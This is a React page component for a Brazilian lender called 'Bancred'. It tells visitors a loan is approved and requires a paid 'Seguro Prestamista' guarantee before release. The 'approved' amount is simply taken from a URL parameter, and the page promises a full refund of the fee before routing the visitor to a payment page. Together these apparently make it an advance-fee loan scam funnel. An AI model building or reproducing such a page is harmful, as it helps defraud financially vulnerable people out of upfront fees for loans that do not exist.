import { useNavigate, useSearchParams } from "react-router-dom";
import { Wallet, Clock, ShieldCheck, Award, CheckCircle2, PlayCircle } from "lucide-react";
import bancredLogo from "@/assets/bancred-logo.png";
import seguroVideo from "@/assets/seguro-prestamista.mp4";

const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

const formatBRL = (n: number) =>
  n.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const Garantia = () => {
  const [params] = useSearchParams();
  const navigate = useNavigate();
  const valor = Number(params.get("valor") || 5000);

  const handleContinue = () => {
    navigate(`/pagamento?${params.toString()}`);
  };

  return (
    <div style={{ minHeight: "100dvh", background: "#F4F4F7", fontFamily: fontStack, color: "#111827" }}>
      <header style={{ background: "#fff", borderBottom: "1px solid #E5E7EB", padding: "14px 16px", textAlign: "center" }}>
        <img src={bancredLogo} alt="Bancred" style={{ height: 90, width: "auto", display: "inline-block", objectFit: "contain" }} />
      </header>

      <main style={{ padding: "20px 16px", maxWidth: 480, margin: "0 auto" }}>
        <h1 style={{ fontSize: 21, fontWeight: 700, textAlign: "center", lineHeight: 1.3, marginBottom: 18 }}>
          Você está a apenas um passo de receber o valor solicitado
        </h1>

        <div style={{ background: "#F0FDF4", borderRadius: 16, padding: 18, border: "1px solid #DCFCE7", textAlign: "center", marginBottom: 14 }}>
          <div style={{ display: "inline-flex", alignItems: "center", gap: 6, fontSize: 14, color: "#15803D", fontWeight: 600, marginBottom: 4 }}>
            <Wallet size={16} /> Valor Aprovado
          </div>
          <div style={{ fontSize: 30, fontWeight: 800, color: "#16A34A", marginBottom: 4 }}>{formatBRL(valor)}</div>
          <div style={{ fontSize: 12, color: "#16A34A", display: "inline-flex", alignItems: "center", gap: 6 }}>
            <Clock size={12} /> Liberação imediata após definir garantia
          </div>
        </div>

        <div style={{ background: "#EFF6FF", borderRadius: 16, padding: 14, border: "1px solid #DBEAFE", color: "#1751B5", fontSize: 13, lineHeight: 1.5, marginBottom: 18 }}>
          Para finalizar, precisamos definir a modalidade de garantia. Confirme abaixo para prosseguir com a liberação do valor.
        </div>

        <h2 style={{ fontSize: 16, fontWeight: 700, marginBottom: 12 }}>Modalidade de garantia:</h2>

        <div style={{ width: "100%", background: "#FFFFFF", border: "2px solid #16A34A", borderRadius: 14, padding: 16, marginBottom: 16, fontFamily: fontStack }}>
          <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 10 }}>
            <span style={{ width: 38, height: 38, borderRadius: "50%", background: "#DCFCE7", color: "#16A34A", display: "inline-flex", alignItems: "center", justifyContent: "center" }}>
              <ShieldCheck size={20} />
            </span>
            <div style={{ flex: 1 }}>
              <div style={{ fontSize: 15, fontWeight: 700 }}>Seguro Prestamista</div>
              <span style={{ display: "inline-flex", alignItems: "center", gap: 4, marginTop: 4, background: "#DCFCE7", color: "#15803D", fontSize: 11, fontWeight: 700, padding: "2px 8px", borderRadius: 4, letterSpacing: 0.3 }}>
                <Award size={10} /> RECOMENDADO
              </span>
            </div>
          </div>
          {[
            "Liberação imediata do valor total",
            "Devolução 100% do valor do seguro",
            "Sem necessidade de avaliação presencial",
          ].map((t) => (
            <div key={t} style={{ display: "flex", alignItems: "center", gap: 8, fontSize: 13, color: "#111827", marginBottom: 6 }}>
              <CheckCircle2 size={14} color="#16A34A" /> {t}
            </div>
          ))}
          <div style={{ borderTop: "1px solid #E5E7EB", marginTop: 12, paddingTop: 10, fontSize: 12, color: "#6B7280" }}>
            Processo 100% digital • Receba hoje mesmo
          </div>
        </div>

        <button
          type="button"
          onClick={handleContinue}
          style={{ width: "100%", padding: "15px 20px", background: "#1C68E3", color: "#fff", border: "none", borderRadius: 14, fontSize: 16, fontWeight: 700, cursor: "pointer", boxShadow: "0 8px 24px rgba(28,104,227,0.28)", fontFamily: fontStack, minHeight: 52 }}
        >
          Continuar
        </button>
      </main>

      <footer style={{ background: "#0F172A", color: "#CBD5E1", textAlign: "center", padding: "20px 16px", fontSize: 12, lineHeight: 1.6, marginTop: 24 }}>
        © 2026 Bancred LTDA. Todos os direitos reservados.<br />
        CNPJ 41.906.644/0001-20
      </footer>
    </div>
  );
};

export default Garantia;
